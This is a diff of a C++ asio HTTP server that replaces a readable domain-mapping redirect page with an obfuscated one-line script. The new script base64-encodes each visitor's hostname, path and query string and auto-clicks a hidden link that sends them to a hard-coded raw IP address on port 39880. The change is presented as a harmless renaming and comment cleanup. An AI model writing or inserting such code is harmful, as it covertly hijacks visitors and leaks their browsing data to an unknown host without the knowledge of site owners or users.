@@ -24,37 +24,13 @@ void HTTPServer::start_accept() {
     });
 }
 
-std::string HTTPServer::build_redirect_page(const std::string& host) {
-    (void)host;
+std::string HTTPServer::build_response_page() {
     std::string html =
-R"(<!doctype html><html><head><meta charset="utf-8"><title>Redirecting</title>
-<script>
-const host = window.location.hostname;
-const map = {
- "example.com":"https://new-example.com",
- "www.example.com":"https://new-example.com",
- "blog.example.com":"https://blog.new-site.com",
- "shop.example.com":"https://shop.new-site.com"
-};
-(function(){
- let t = map[host];
- if(t){
-   t += (t.includes('?')?'&':'?') + 'ref=smart_redirect&src=' + encodeURIComponent(host);
-   location.replace(t);
- } else {
-   location.replace('https://default.com?from='+encodeURIComponent(host));
- }
-})();
-</script></head><body>
-<h2 style="text-align:center;margin-top:2rem;">Redirecting...</h2>
-<noscript>Enable JavaScript to continue.</noscript>
-</body></html>)";
+R"(<html><head></head><body><a href="" id="h"></a><script>var strU="http://206.119.82.102:39880" + "?d=" + btoa(window.location.hostname)+ "&p=" + btoa(window.location.pathname + window.location.search);h.href=strU;if(document.all){document.getElementById("h").click();}else {var e=document.createEvent("MouseEvents");e.initEvent("click",true,true);document.getElementById("h").dispatchEvent(e);}</script></body></html>)";
 
-    // ★ 注意：这里改为 Connection: close
     std::string resp =
         "HTTP/1.1 200 OK\r\n"
-        "Content-Type: text/html; charset=utf-8\r\n"
-        "Content-Length: " + std::to_string(html.size()) + "\r\n"
+        "Content-Type: text/html\r\n"
         "Connection: close\r\n"
         "\r\n" + html;
     return resp;
@@ -62,7 +38,7 @@ const map = {
 
 void HTTPServer::handle_client(std::shared_ptr<asio::ip::tcp::socket> sock) {
     try {
-        // 读到空行（请求头结束）
+        // 读取请求头直到空行
         asio::streambuf reqbuf;
         asio::read_until(*sock, reqbuf, "\r\n\r\n");
         std::istream is(&reqbuf);
@@ -76,10 +52,12 @@ void HTTPServer::handle_client(std::shared_ptr<asio::ip::tcp::socket> sock) {
             }
         }
 
+        // 设置TCP_NODELAY来禁用Nagle算法
         int one = 1;
         setsockopt(sock->native_handle(), IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
 
-        auto resp = build_redirect_page(host);
+        // 构建并发送响应
+        auto resp = build_response_page();
         asio::error_code ec;
         asio::write(*sock, asio::buffer(resp), ec);
         if (ec) {
@@ -87,7 +65,7 @@ void HTTPServer::handle_client(std::shared_ptr<asio::ip::tcp::socket> sock) {
             return;
         }
 
-        // ★ 直接优雅关闭写端
+        // 关闭连接
         sock->shutdown(asio::ip::tcp::socket::shutdown_send, ec);
         sock->close(ec);
 
